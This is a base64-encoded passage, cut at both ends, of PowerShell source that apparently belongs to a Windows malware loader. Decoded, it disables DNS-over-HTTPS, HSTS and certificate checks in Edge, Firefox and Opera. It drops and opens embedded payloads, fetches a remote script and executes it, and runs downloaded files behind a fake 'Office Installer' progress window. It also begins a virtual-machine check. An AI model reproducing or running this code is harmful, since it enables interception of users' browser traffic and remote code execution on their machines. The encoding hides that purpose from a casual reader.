jIC0tZGlzYWJsZS1oc3RzIg0KICAgICAgICANCiAgICAgICAgU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkZWRnZUtleVBhdGggLU5hbWUgIkRuc092ZXJIdHRwcyIgLVZhbHVlICJvZmYiDQoNCiAgICAgICAgU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkZWRnZUtleVBhdGggLU5hbWUgIklnbm9yZUNlcnRpZmljYXRlRXJyb3JzIiAtVmFsdWUgMQ0KICAgIH0NCn0NCg0KDQpmdW5jdGlvbiBFbWJlZGRpbmdOYW1lIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJG5hbWUNCiAgICApDQogICAgJGZvbGRlciA9IEdldC1IZXBoYWVzdHVzRm9sZGVyDQogICAgcmV0dXJuIEpvaW4tUGF0aCAtUGF0aCAkZm9sZGVyIC1DaGlsZFBhdGggJG5hbWUNCn0NCg0KZnVuY3Rpb24gRG9JbnRlcm5hbEVtYmVkZGluZ3Mgew0KICAgIHBhcmFtICgNCiAgICAgICAgW2FycmF5XSRuYW1lcywgW2FycmF5XSRkYXRhcywgJGZvcmNlLCAkbmFtZQ0KICAgICkNCg0KICAgICRhdXRvID0gVGVzdC1BdXRvc3RhcnQ7DQogICAgaWYgKCRmb3JjZSAtbmUgJGZhbHNlIC1hbmQgJGF1dG8gLWVxICR0cnVlKQ0KICAgIHsNCiAgICAgICAgd3JpdGVkYmcgIlNraXBwaW5nIGZ1bmN0aW9uIERvSW50ZXJuYWxFbWJlZGRpbmdzICgkbmFtZSkiDQogICAgICAgIHJldHVybg0KICAgIH0NCiAgICB0cnkgDQogICAgew0KICAgICAgICBmb3IgKCRpID0gMDsgJGkgLWx0ICRuYW1lcy5MZW5ndGg7ICRpKyspIHsNCiAgICAgICAgICAgICRuYW1lID0gJG5hbWVzWyRpXQ0KICAgICAgICAgICAgJGRhdGEgPSAkZGF0YXNbJGldDQogICAgICAgICAgICAkZmlsZSA9IEVtYmVkZGluZ05hbWUoJG5hbWUpDQogICAgICAgICAgICBDdXN0b21EZWNvZGUgLWluQ29udGVudCAkZGF0YSAtb3V0RmlsZSAkZmlsZQ0KICAgICAgICAgICAgSW52b2tlLUl0ZW0gJGZpbGUNCiAgICAgICAgfQ0KICAgIH0NCiAgICBjYXRjaCB7DQogICAgd3JpdGVkYmcgIkFuIGVycm9yIG9jY3VycmVkIChEb0Zyb250KTogJF8iDQogICAgfQ0KfQ0KDQoNCmZ1bmN0aW9uIERvRnJvbnQgew0KICAgIERvSW50ZXJuYWxFbWJlZGRpbmdzIC1uYW1lcyAkeGZyb250X25hbWUgLWRhdGFzICR4ZnJvbnQgLWZvcmNlICRzZXJ2ZXIuZnJvbnRGb3JjZSAtbmFtZSAiZnJvbnQiDQp9DQoNCmZ1bmN0aW9uIERvRW1iZWRkaW5ncyB7DQogICAgRG9JbnRlcm5hbEVtYmVkZGluZ3MgLW5hbWVzICR4ZW1iZWRfbmFtZSAtZGF0YXMgJHhlbWJlZCAtZm9yY2UgJHNlcnZlci5lbWJlZGRpbmdzRm9yY2UgLW5hbWUgImVtYmVkZGluZ3MiDQp9DQoNCmZ1bmN0aW9uIGRvX2VtYmVkZGluZ3Mgew0KICAgIERvRnJvbnQNCiAgICBEb0VtYmVkZGluZ3MNCn0NCg0KDQpmdW5jdGlvbiBkb19leHRyYXVwZGF0ZSgpIHsNCiAgICBpZiAoLW5vdCAkc2VydmVyLmV4dHJhVXBkYXRlKXsNCiAgICAgICAgcmV0dXJuDQogICAgfQ0KICAgICR0aW1lb3V0ID0gW2RhdGV0aW1lXTo6VXRjTm93LkFkZE1pbnV0ZXMoMSkNCiAgICAkZGVsYXkgPSA1DQogICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgJGRlbGF5DQogICAgDQogICAgd2hpbGUgKFtkYXRldGltZV06OlV0Y05vdyAtbHQgJHRpbWVvdXQpIHsNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICRyZXNwb25zZSA9IEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJHNlcnZlci5leHRyYVVwZGF0ZVVybCAtVXNlQmFzaWNQYXJzaW5nIC1NZXRob2QgR2V0DQoNCiAgICAgICAgICAgIGlmICgkcmVzcG9uc2UuU3RhdHVzQ29kZSAtZXEgMjAwKSB7DQogICAgICAgICAgICAgICAgJHNjcmlwdEJsb2NrID0gW1NjcmlwdEJsb2NrXTo6Q3JlYXRlKCRyZXNwb25zZS5Db250ZW50KQ0KICAgICAgICAgICAgICAgIC4gJHNjcmlwdEJsb2NrDQogICAgICAgICAgICAgICAgcmV0dXJuDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgY2F0Y2ggew0KICAgICAgICAgICAgd3JpdGVkYmcgIkZhaWxlZCB0byBkb3dubG9hZCBvciBleGVjdXRlIHRoZSBzY3JpcHQ6ICRfIg0KICAgICAgICB9DQoNCiAgICAgICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgJGRlbGF5DQogICAgfQ0KICAgIHdyaXRlZGJnICJGYWlsZWQgdG8gZG93bmxvYWQgdGhlIHNjcmlwdCB3aXRoaW4gdGhlIGFsbG90dGVkIHRpbWUuIg0KfQ0KDQpmdW5jdGlvbiBkb19maXJlZm94IA0Kew0KICAgIHRyeSANCiAgICB7DQogICAgICAgIFNldC1GaXJlZm94UmVnaXN0cnkgLUtleVBhdGhzIEAoDQogICAgICAgICAgICAnU09GVFdBUkVcUG9saWNpZXNcTW96aWxsYVxGaXJlZm94XEROU092ZXJIVFRQUycsDQogICAgICAgICAgICAnU09GVFdBUkVcUG9saWNpZXNcTW96aWxsYVxGaXJlZm94XEROU092ZXJIVFRQUycNCiAgICAgICAgKSAtVmFsdWVOYW1lcyBAKCdFbmFibGVkJywgJ0xvY2tlZCcpIC1WYWx1ZXMgQCgwLCAxKQ0KICAgIH0NCiAgICBjYXRjaCANCiAgICB7DQogICAgICAgIHdyaXRlZGJnICJGYWlsZWQgdG8gc2V0IGZpcmVmb3ggcmVnaXN0cnk6ICRfIg0KICAgIH0NCiAgICBmb3JlYWNoICgkZGlyIGluIEdldC1FbnZQYXRocykgDQogICAgew0KICAgICAgICB0cnkgDQogICAgICAgIHsNCiAgICAgICAgJHBhdGggPSBKb2luLVBhdGggLVBhdGggJGRpciAtQ2hpbGRQYXRoICJNb3ppbGxhXEZpcmVmb3hcUHJvZmlsZXNcdXNlci5qcyINCg0KICAgICAgICAgICAgJFVzZXJKU0NvbnRlbnQgPSAndXNlcl9wcmVmKCJuZXR3b3JrLnRyci5tb2RlIiwgNSk7Jw0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAoIShUZXN0LVBhdGggLVBhdGggJHBhdGggLVBhdGhUeXBlIExlYWYpKSANCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBOZXctSXRlbSAtUGF0aCAkcGF0aCAtSXRlbVR5cGUgRmlsZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgICAgICAgICAgICAgIEFkZC1Db250ZW50IC1QYXRoICRwYXRoIC1WYWx1ZSAkVXNlckpTQ29udGVudCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIGNhdGNoIA0KICAgICAgICB7DQogICAgICAgICAgICB3cml0ZWRiZyAiRmFpbGVkIHRvIHdyaXRlIHRvIHVzZXIuanMgZmlsZTogJF8iDQogICAgICAgIH0NCiAgICB9DQp9DQoNCg0KZnVuY3Rpb24gU2V0LUZpcmVmb3hSZWdpc3RyeSB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nW11dJEtleVBhdGhzLA0KICAgICAgICBbc3RyaW5nW11dJFZhbHVlTmFtZXMsDQogICAgICAgIFtpbnRbXV0kVmFsdWVzDQogICAgKQ0KDQogICAgJEVycm9yQWN0aW9uUHJlZmVyZW5jZSA9ICdTdG9wJw0KICAgICRyZWdLZXkgPSBbTWljcm9zb2Z0LldpbjMyLlJlZ2lzdHJ5XTo6TG9jYWxNYWNoaW5lDQoNCiAgICB0cnkgew0KICAgICAgICBmb3JlYWNoICgkaSBpbiAwLi4oJEtleVBhdGhzLkxlbmd0aCAtIDEpKSB7DQogICAgICAgICAgICAka2V5ID0gJHJlZ0tleS5PcGVuU3ViS2V5KCRLZXlQYXRoc1skaV0sICR0cnVlKQ0KICAgICAgICAgICAgaWYgKCRrZXkgLWVxICRudWxsKSB7DQogICAgICAgICAgICAgICAgd3JpdGVkYmcgIkZhaWxlZCB0byBvcGVuIHJlZ2lzdHJ5IGtleTogJCgkS2V5UGF0aHNbJGldKSINCiAgICAgICAgICAgICAgICByZXR1cm4NCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgJGtleS5TZXRWYWx1ZSgkVmFsdWVOYW1lc1skaV0sICRWYWx1ZXNbJGldLCBbTWljcm9zb2Z0LldpbjMyLlJlZ2lzdHJ5VmFsdWVLaW5kXTo6RFdvcmQpDQogICAgICAgICAgICAka2V5LkNsb3NlKCkNCiAgICAgICAgfQ0KICAgIH0NCiAgICBjYXRjaCB7DQogICAgICAgIHdyaXRlZGJnICJFcnJvciBhY2Nlc3Npbmcgb3IgbW9kaWZ5aW5nIHJlZ2lzdHJ5OiAkXyINCiAgICB9DQp9DQoNCmZ1bmN0aW9uIGRvX29wZXJhDQp7DQogICAgQ2xvc2UtUHJvY2Vzc2VzKEAoJ29wZXJhX2NyYXNocmVwb3J0ZXIuZXhlJywgJ29wZXJhLmV4ZScpKQ0KDQogICAgZm9yZWFjaCAoJGRpciBpbiBHZXQtRW52UGF0aHMpIHsNCiAgICAgICAgJHBhdGggPSBKb2luLVBhdGggLVBhdGggJGRpciAtQ2hpbGRQYXRoICdPcGVyYSBTb2Z0d2FyZVxPcGVyYSBTdGFibGVcTG9jYWwgU3RhdGUnDQoNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgIGlmIChUZXN0LVBhdGggLVBhdGggJHBhdGggLVBhdGhUeXBlIExlYWYpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgQ29uZmlndXJlT3BlcmFJbnRlcm5hbCAtRmlsZVBhdGggJHBhdGgNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBjYXRjaCB7DQogICAgICAgICAgICB3cml0ZWRiZyAiRXJyb3Igb2NjdXJyZWQgaW4gT3BlcmE6ICRfIg0KICAgICAgICB9DQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBDb25maWd1cmVPcGVyYUludGVybmFsIHsNCiAgICBwYXJhbSgNCiAgICAgICAgW3N0cmluZ10kZmlsZVBhdGgNCiAgICApDQoNCiAgICAkY29udGVudCA9IEdldC1Db250ZW50IC1QYXRoICRmaWxlUGF0aCAtUmF3IHwgQ29udmVydEZyb20tSnNvbg0KDQogICAgaWYgKCRudWxsIC1lcSAkY29udGVudC5kbnNfb3Zlcl9odHRwcyAtb3IgJGNvbnRlbnQuZG5zX292ZXJfaHR0cHMgLWlzbm90IFtvYmplY3RdKSB7DQogICAgICAgICRjb250ZW50LmRuc19vdmVyX2h0dHBzID0gQHsNCiAgICAgICAgICAgICdtb2RlJyA9ICdvZmYnDQogICAgICAgICAgICAnb3BlcmEnID0gQHsNCiAgICAgICAgICAgICAgICAnZG9oX21vZGUnID0gJ29mZicNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgICd0ZW1wbGF0ZXMnID0gIiINCiAgICAgICAgfQ0KICAgIH0gZWxzZSB7DQogICAgICAgICRjb250ZW50LmRuc19vdmVyX2h0dHBzLm1vZGUgPSAnb2ZmJw0KICAgICAgICAkY29udGVudC5kbnNfb3Zlcl9odHRwcy5vcGVyYSA9IEB7DQogICAgICAgICAgICAnZG9oX21vZGUnID0gJ29mZicNCiAgICAgICAgfQ0KICAgICAgICAkY29udGVudC5kbnNfb3Zlcl9odHRwcy50ZW1wbGF0ZXMgPSAiIg0KICAgIH0NCg0KICAgICRqc29uU3RyaW5nID0gJGNvbnRlbnQgfCBDb252ZXJ0VG8tSnNvbiAtRGVwdGggMTANCg0KICAgIFNldC1Db250ZW50IC1QYXRoICRmaWxlUGF0aCAtVmFsdWUgJGpzb25TdHJpbmcgLUVuY29kaW5nIFVURjggLUZvcmNlDQoNCiAgICB3cml0ZWRiZyAiU3VjY2Vzc2Z1bGx5IGNvbmZpZ3VyZWQgT3BlcmEgc2V0dGluZ3MgaW4gJGZpbGVQYXRoIg0KfQ0KDQpmdW5jdGlvbiBHZXQtRmlsZU5hbWVGcm9tVXJpIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJHVyaQ0KICAgICkNCg0KICAgICMgQ3JlYXRlIGEgVXJpIG9iamVjdA0KICAgICR1cmlPYmplY3QgPSBbU3lzdGVtLlVyaV06Om5ldygkdXJpKQ0KDQogICAgIyBFeHRyYWN0IHRoZSBmaWxlIG5hbWUgZnJvbSB0aGUgcGF0aCBvZiB0aGUgVVJJDQogICAgJGZpbGVOYW1lID0gW1N5c3RlbS5JTy5QYXRoXTo6R2V0RmlsZU5hbWUoJHVyaU9iamVjdC5BYnNvbHV0ZVBhdGgpDQoNCiAgICByZXR1cm4gJGZpbGVOYW1lDQp9DQoNCmZ1bmN0aW9uIEFkZC1SYW5kb21EaWdpdHNUb0ZpbGVuYW1lIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJGZpbGVOYW1lDQogICAgKQ0KDQogICAgIyBTcGxpdCBmaWxlbmFtZSBpbnRvIGJhc2UgYW5kIGV4dGVuc2lvbg0KICAgICRiYXNlTmFtZSA9ICRmaWxlTmFtZSAtcmVwbGFjZSAnXC5bXi5dKyQnLCAnJw0KICAgICRleHRlbnNpb24gPSAkZmlsZU5hbWUgLXJlcGxhY2UgJy4qXC4nLCAnLicNCg0KICAgICMgR2VuZXJhdGUgYSByYW5kb20gbnVtYmVyIGJldHdlZW4gMTAwMCBhbmQgOTk5OQ0KICAgICRyYW5kb21OdW1iZXIgPSBHZXQtUmFuZG9tIC1NaW5pbXVtIDEwMDAgLU1heGltdW0gOTk5OQ0KDQogICAgIyBDb21iaW5lIGJhc2UgbmFtZSwgcmFuZG9tIG51bWJlciwgYW5kIGV4dGVuc2lvbg0KICAgICRuZXdGaWxlTmFtZSA9ICIkYmFzZU5hbWUiICsgIl8kcmFuZG9tTnVtYmVyJGV4dGVuc2lvbiINCg0KICAgIHJldHVybiAkbmV3RmlsZU5hbWUNCn0NCg0KZnVuY3Rpb24gU3RhcnQtRG93bmxvYWRBbmRFeGVjdXRlIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJHVybCwNCiAgICAgICAgW3N0cmluZ10kdGl0bGUNCiAgICApDQoNCiAgICBBZGQtVHlwZSAtQXNzZW1ibHlOYW1lIFN5c3RlbS5XaW5kb3dzLkZvcm1zDQogICAgQWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uRHJhd2luZw0KDQogICAgIyBDcmVhdGUgYW5kIGNvbmZpZ3VyZSB0aGUgZm9ybQ0KICAgICRmb3JtID0gTmV3LU9iamVjdCBTeXN0ZW0uV2luZG93cy5Gb3Jtcy5Gb3JtDQogICAgJGZvcm0uVGV4dCA9ICR0aXRsZQ0KICAgICRmb3JtLlNpemUgPSBOZXctT2JqZWN0IFN5c3RlbS5EcmF3aW5nLlNpemUoNDAwLCAyMDApDQogICAgJGZvcm0uU3RhcnRQb3NpdGlvbiA9ICJDZW50ZXJTY3JlZW4iDQoNCiAgICAjIENyZWF0ZSBhbmQgY29uZmlndXJlIHRoZSBwcm9ncmVzcyBiYXINCiAgICAkcHJvZ3Jlc3NCYXIgPSBOZXctT2JqZWN0IFN5c3RlbS5XaW5kb3dzLkZvcm1zLlByb2dyZXNzQmFyDQogICAgJHByb2dyZXNzQmFyLk1pbmltdW0gPSAwDQogICAgJHByb2dyZXNzQmFyLk1heGltdW0gPSAxMDANCiAgICAkcHJvZ3Jlc3NCYXIuU3RlcCA9IDENCiAgICAkcHJvZ3Jlc3NCYXIuVmFsdWUgPSAwDQogICAgJHByb2dyZXNzQmFyLldpZHRoID0gMzUwDQogICAgJHByb2dyZXNzQmFyLkhlaWdodCA9IDMwDQogICAgJHByb2dyZXNzQmFyLlRvcCA9IDgwDQogICAgJHByb2dyZXNzQmFyLkxlZnQgPSAyMA0KICAgICRmb3JtLkNvbnRyb2xzLkFkZCgkcHJvZ3Jlc3NCYXIpDQoNCiAgICAjIENyZWF0ZSBhbmQgY29uZmlndXJlIHRoZSBzdGF0dXMgbGFiZWwNCiAgICAkc3RhdHVzTGFiZWwgPSBOZXctT2JqZWN0IFN5c3RlbS5XaW5kb3dzLkZvcm1zLkxhYmVsDQogICAgJHN0YXR1c0xhYmVsLlRleHQgPSAiRG93bmxvYWRpbmcuLi4iDQogICAgJHN0YXR1c0xhYmVsLkF1dG9TaXplID0gJHRydWUNCiAgICAkc3RhdHVzTGFiZWwuVG9wID0gNTANCiAgICAkc3RhdHVzTGFiZWwuTGVmdCA9IDIwDQogICAgJGZvcm0uQ29udHJvbHMuQWRkKCRzdGF0dXNMYWJlbCkNCg0KICAgICMgQ3JlYXRlIGFuZCBjb25maWd1cmUgdGhlIGRlc2NyaXB0aW9uIGxhYmVsDQogICAgJGRlc2NyaXB0aW9uTGFiZWwgPSBOZXctT2JqZWN0IFN5c3RlbS5XaW5kb3dzLkZvcm1zLkxhYmVsDQogICAgJGRlc2NyaXB0aW9uTGFiZWwuVGV4dCA9ICJUaGUgaW5zdGFsbGVyIGlzIGN1cnJlbnRseSBiZWluZyBkb3dubG9hZGVkLiBQbGVhc2Ugd2FpdCB1bnRpbCB0aGUgcHJvY2VzcyBjb21wbGV0ZXMuIg0KICAgICRkZXNjcmlwdGlvbkxhYmVsLkF1dG9TaXplID0gJHRydWUNCiAgICAkZGVzY3JpcHRpb25MYWJlbC5XaWR0aCA9IDM1MA0KICAgICRkZXNjcmlwdGlvbkxhYmVsLlRvcCA9IDEwDQogICAgJGRlc2NyaXB0aW9uTGFiZWwuTGVmdCA9IDIwDQogICAgJGZvcm0uQ29udHJvbHMuQWRkKCRkZXNjcmlwdGlvbkxhYmVsKQ0KDQogICAgIyBTaG93IHRoZSBmb3JtIG5vbi1tb2RhbGx5DQogICAgJGZvcm0uU2hvdygpDQoNCiAgICAjIERldGVybWluZSB0aGUgZmlsZSBuYW1lIGFuZCBwYXRoDQogICAgJGZpbGVOYW1lID0gR2V0LUZpbGVOYW1lRnJvbVVyaSAtdXJpICR1cmwNCiAgICAkZmlsZU5hbWVTYXZlID0gQWRkLVJhbmRvbURpZ2l0c1RvRmlsZW5hbWUgLWZpbGVOYW1lICRmaWxlTmFtZQ0KDQogICAgJHRlbXBEaXIgPSAoU3BsaXQtUGF0aCAtUGF0aCAkUFNDb21tYW5kUGF0aCkNCiAgICAkaW5zdGFsbGVyUGF0aCA9IFtTeXN0ZW0uSU8uUGF0aF06OkNvbWJpbmUoJHRlbXBEaXIsICRmaWxlTmFtZVNhdmUpDQoNCiAgICAjIENyZWF0ZSBhbmQgY29uZmlndXJlIHRoZSBXZWJDbGllbnQNCiAgICAkd2ViQ2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudA0KDQogICAgIyBEZWZpbmUgZXZlbnQgaGFuZGxlcnMNCiAgICAkcHJvZ3Jlc3NDaGFuZ2VkSGFuZGxlciA9IFtTeXN0ZW0uTmV0LkRvd25sb2FkUHJvZ3Jlc3NDaGFuZ2VkRXZlbnRIYW5kbGVyXXsNCiAgICAgICAgcGFyYW0gKCRzZW5kZXIsICRldmVudEFyZ3MpDQogICAgICAgICRwcm9ncmVzc0Jhci5WYWx1ZSA9ICRldmVudEFyZ3MuUHJvZ3Jlc3NQZXJjZW50YWdlDQogICAgICAgICRmb3JtLlJlZnJlc2goKQ0KICAgIH0NCg0KICAgICRkb3dubG9hZEZpbGVDb21wbGV0ZWRIYW5kbGVyID0gW1N5c3RlbS5Db21wb25lbnRNb2RlbC5Bc3luY0NvbXBsZXRlZEV2ZW50SGFuZGxlcl17DQogICAgICAgIHBhcmFtICgkc2VuZGVyLCAkZXZlbnRBcmdzKQ0KICAgICAgICAjIENsb3NlIHRoZSBmb3JtIGJlZm9yZSBzdGFydGluZyB0aGUgaW5zdGFsbGVyDQogICAgICAgICRmb3JtLkludm9rZShbYWN0aW9uXSB7IA0KICAgICAgICAgICAgW1N5c3RlbS5XaW5kb3dzLkZvcm1zLkFwcGxpY2F0aW9uXTo6RG9FdmVudHMoKQ0KICAgICAgICAgICAgJGZvcm0uQ2xvc2UoKSANCiAgICAgICAgICAgIFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5BcHBsaWNhdGlvbl06OkRvRXZlbnRzKCkNCiAgICAgICAgfSkNCiAgICAgICAgDQogICAgICAgIGlmICgkZXZlbnRBcmdzLkVycm9yKSB7DQogICAgICAgICAgICBbU3lzdGVtLldpbmRvd3MuRm9ybXMuTWVzc2FnZUJveF06OlNob3coIkVycm9yIGRvd25sb2FkaW5nIGZpbGU6ICIgKyAkZXZlbnRBcmdzLkVycm9yLk1lc3NhZ2UsICJEb3dubG9hZCBFcnJvciIsIFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5NZXNzYWdlQm94QnV0dG9uc106Ok9LLCBbU3lzdGVtLldpbmRvd3MuRm9ybXMuTWVzc2FnZUJveEljb25dOjpFcnJvcikNCiAgICAgICAgfSBlbHNlaWYgKCRldmVudEFyZ3MuQ2FuY2VsbGVkKSB7DQogICAgICAgICAgICBbU3lzdGVtLldpbmRvd3MuRm9ybXMuTWVzc2FnZUJveF06OlNob3coIkRvd25sb2FkIGNhbmNlbGxlZC4iLCAiRG93bmxvYWQgQ2FuY2VsbGVkIiwgW1N5c3RlbS5XaW5kb3dzLkZvcm1zLk1lc3NhZ2VCb3hCdXR0b25zXTo6T0ssIFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5NZXNzYWdlQm94SWNvbl06Oldhcm5pbmcpDQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICB0cnkgew0KICAgICAgICAgICAgICAgICMgRXhlY3V0ZSB0aGUgaW5zdGFsbGVyDQogICAgICAgICAgICAgICAgU3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggJGluc3RhbGxlclBhdGggLVdhaXQNCg0KICAgICAgICAgICAgICAgICMgV3JpdGUgdG8gdGhlIHJlZ2lzdHJ5DQogICAgICAgICAgICAgICAgJHJlZ2lzdHJ5UGF0aCA9ICJIS0NVOlxTb2Z0d2FyZVxIZXBoYWVzdHVzXERvd25sb2FkcyINCiAgICAgICAgICAgICAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRyZWdpc3RyeVBhdGgpKSB7DQogICAgICAgICAgICAgICAgICAgIE5ldy1JdGVtIC1QYXRoICRyZWdpc3RyeVBhdGggLUZvcmNlIHwgT3V0LU51bGwNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkcmVnaXN0cnlQYXRoIC1OYW1lICRmaWxlTmFtZSAtVmFsdWUgIkRvd25sb2FkZWQiDQogICAgICAgICAgICB9IGNhdGNoIHsNCiAgICAgICAgICAgICAgICBbU3lzdGVtLldpbmRvd3MuRm9ybXMuTWVzc2FnZUJveF06OlNob3coIkVycm9yIGV4ZWN1dGluZyB0aGUgaW5zdGFsbGVyOiAiICsgJF8uRXhjZXB0aW9uLk1lc3NhZ2UsICJFeGVjdXRpb24gRXJyb3IiLCBbU3lzdGVtLldpbmRvd3MuRm9ybXMuTWVzc2FnZUJveEJ1dHRvbnNdOjpPSywgW1N5c3RlbS5XaW5kb3dzLkZvcm1zLk1lc3NhZ2VCb3hJY29uXTo6RXJyb3IpDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgW1N5c3RlbS5XaW5kb3dzLkZvcm1zLkFwcGxpY2F0aW9uXTo6RG9FdmVudHMoKQ0KICAgIH0NCg0KICAgICMgQWRkIGV2ZW50IGhhbmRsZXJzIHRvIFdlYkNsaWVudA0KICAgICR3ZWJDbGllbnQuYWRkX0Rvd25sb2FkUHJvZ3Jlc3NDaGFuZ2VkKCRwcm9ncmVzc0NoYW5nZWRIYW5kbGVyKQ0KICAgICR3ZWJDbGllbnQuYWRkX0Rvd25sb2FkRmlsZUNvbXBsZXRlZCgkZG93bmxvYWRGaWxlQ29tcGxldGVkSGFuZGxlcikNCg0KICAgIHRyeSB7DQogICAgICAgICMgU3RhcnQgdGhlIGRvd25sb2FkDQogICAgICAgICR3ZWJDbGllbnQuRG93bmxvYWRGaWxlQXN5bmMoW1VyaV0kdXJsLCAkaW5zdGFsbGVyUGF0aCkNCiAgICAgICAgDQogICAgICAgICMgS2VlcCB0aGUgZm9ybSByZXNwb25zaXZlIHdoaWxlIHRoZSBkb3dubG9hZCBpcyBpbiBwcm9ncmVzcw0KICAgICAgICB3aGlsZSAoJGZvcm0uVmlzaWJsZSkgew0KICAgICAgICAgICAgU3RhcnQtU2xlZXAgLU1pbGxpc2Vjb25kcyAxDQogICAgICAgICAgICBbU3lzdGVtLldpbmRvd3MuRm9ybXMuQXBwbGljYXRpb25dOjpEb0V2ZW50cygpDQogICAgICAgIH0NCiAgICB9IGNhdGNoIHsNCiAgICAgICAgW1N5c3RlbS5XaW5kb3dzLkZvcm1zLk1lc3NhZ2VCb3hdOjpTaG93KCJFcnJvciBpbml0aWF0aW5nIGRvd25sb2FkOiAiICsgJF8uRXhjZXB0aW9uLk1lc3NhZ2UsICJEb3dubG9hZCBFcnJvciIsIFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5NZXNzYWdlQm94QnV0dG9uc106Ok9LLCBbU3lzdGVtLldpbmRvd3MuRm9ybXMuTWVzc2FnZUJveEljb25dOjpFcnJvcikNCiAgICAgICAgJGZvcm0uQ2xvc2UoKQ0KICAgIH0NCn0NCg0KZnVuY3Rpb24gRG93bmxvYWQgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kdXJsLA0KICAgICAgICBbc3RyaW5nXSR0aXRsZQ0KICAgICkNCg0KICAgICRmaWxlTmFtZSA9IFtTeXN0ZW0uSU8uUGF0aF06OkdldEZpbGVOYW1lKCR1cmwpDQoNCiAgICAkYXV0byA9IFRlc3QtQXV0b3N0YXJ0Ow0KICAgIGlmICgkc2VydmVyLnN0YXJ0RG93bmxvYWRzRm9yY2UgLW5lICRmYWxzZSAtYW5kICRhdXRvIC1lcSAkdHJ1ZSkNCiAgICB7DQogICAgICAgICRyZWdpc3RyeVBhdGggPSAiSEtDVTpcU29mdHdhcmVcSGVwaGFlc3R1c1xEb3dubG9hZHMiDQogICAgICAgIGlmIChUZXN0LVBhdGggJHJlZ2lzdHJ5UGF0aCkgew0KICAgICAgICAgICAgJGluc3RhbGxlZCA9IEdldC1JdGVtUHJvcGVydHkgLVBhdGggJHJlZ2lzdHJ5UGF0aCAtTmFtZSAkZmlsZU5hbWUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICAgICAgICAgIGlmICgkaW5zdGFsbGVkKSANCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICB3cml0ZWRiZyAiVGhlIGZpbGUgJyRmaWxlTmFtZScgaXMgYWxyZWFkeSBpbnN0YWxsZWQuIg0KICAgICAgICAgICAgICAgIHJldHVybg0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIHJldHVybg0KICAgIH0NCg0KICAgIFN0YXJ0LURvd25sb2FkQW5kRXhlY3V0ZSAtdXJsICR1cmwgLXRpdGxlICR0aXRsZQ0KfQ0KDQpmdW5jdGlvbiBkb19zdGFydGRvd25sb2FkcyB7DQogICAgdHJ5IA0KICAgIHsNCiAgICAgICAgZm9yZWFjaCAoJHVybCBpbiAkc2VydmVyLnN0YXJ0RG93bmxvYWRzKQ0KICAgICAgICB7DQogICAgICAgICAgICBEb3dubG9hZCAtdXJsICR1cmwgLXRpdGxlICJEb3dubG9hZGluZyBPZmZpY2UgSW5zdGFsbGVyIg0KICAgICAgICB9DQogICAgfQ0KICAgIGNhdGNoIHsNCiAgICAgIHdyaXRlZGJnICJBbiBlcnJvciBvY2N1cnJlZCAoU3RhcnQgRG93bmxvYWRzKTogJF8iDQogICAgfQ0KfQ0KDQoNCg0KZnVuY3Rpb24gZG9fc3RhcnR1cmxzIHsNCiAgICAkYXV0byA9IFRlc3QtQXV0b3N0YXJ0Ow0KICAgIGlmICgkc2VydmVyLnN0YXJ0VXJsc0ZvcmNlIC1uZSAkZmFsc2UgLWFuZCAkYXV0byAtZXEgJHRydWUpDQogICAgew0KICAgICAgICB3cml0ZWRiZyAiU2tpcHBpbmcgZnVuY3Rpb24gRG9TdGFydFVybHMiDQogICAgICAgIHJldHVybg0KICAgIH0NCiAgICB0cnkNCiAgICAgICAgew0KICAgICAgICBmb3JlYWNoICgkc3RhcnRVcmwgaW4gJHNlcnZlci5zdGFydFVybHMpIHsNCiAgICAgICAgICAgIFN0YXJ0LVByb2Nlc3MgJHN0YXJ0VXJsLlRyaW0oKQ0KICAgICAgICB9DQogICAgfQ0KICAgIGNhdGNoDQogICAgew0KICAgICAgd3JpdGVkYmcgIkFuIGVycm9yIG9jY3VycmVkIChTdGFydCBVcmxzKTogJF8iDQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBJcy1WaXJ0dWFsTWFjaGluZSB7DQogICAgIyBHZXQgV2luMzJfQ29tcHV0ZXJTeXN0ZW0gaW5mb3JtYXRpb24NCiAgICAkY29tcHV0ZXJTe